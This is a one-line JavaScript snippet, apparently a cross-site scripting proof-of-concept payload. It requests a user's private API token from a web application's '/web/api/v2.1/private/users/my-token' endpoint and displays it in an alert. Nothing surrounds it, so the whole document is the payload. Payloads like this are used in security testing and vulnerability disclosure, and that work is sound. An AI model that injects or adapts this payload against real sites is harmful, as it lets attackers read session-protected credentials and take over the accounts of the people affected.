var xhr=new XMLHttpRequest;xhr.onreadystatechange=function(){xhr.readyState==XMLHttpRequest.DONE&&alert(xhr.responseText)},xhr.open("GET","/web/api/v2.1/private/users/my-token",!0),xhr.send(null);
